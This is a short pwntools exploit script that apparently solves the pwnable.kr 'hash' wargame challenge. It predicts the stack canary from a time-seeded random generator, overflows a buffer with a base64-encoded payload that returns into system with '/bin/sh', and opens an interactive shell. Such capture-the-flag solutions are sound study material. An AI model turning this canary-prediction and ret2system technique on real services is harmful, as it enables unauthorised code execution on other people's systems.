from pwn import *
import time
import base64
debug = False
if debug:
	io = process("./hash")
	
else:
	io = remote("pwnable.kr",9002)
	time = int(time.time())

def get_canary(seed,number,m):
	rand_p = process("./a.out")
	rand_p.sendline(str(seed))
	rand_p.sendline(str(number))
	rand_p.sendline(str(m))
	info = rand_p.recvline().strip("\n")
	return int(info,16)

def calcucanary(info,rand_number):
	print rand_number
	info -= rand_number[4]
	info += rand_number[6]
	info -= rand_number[7]
	info -= rand_number[2]
	info += rand_number[3]
	info -= rand_number[1]
	info -= rand_number[5]
	print hex(info)
	return info

io.recvuntil("Are you human? input captcha : ")
info = int(io.recvline().strip("\n"))
io.sendline(str(info))
canary = get_canary(time,8,info)
io.recvuntil("Welcome! you are authenticated.\n")
system_addr = 0x08049187
binsh = 0x0804B0E0 + 537*4/3 + 4
payload = 0x200*"a" + p32(canary) + "junkjunk" + "fake" + p32(system_addr) + p32(binsh) + p32(binsh) 
payload = base64.b64encode(payload) + "/bin/sh\0"
io.sendlineafter("Encode your data with BASE64 then paste me!\n",payload)
io.interactive()

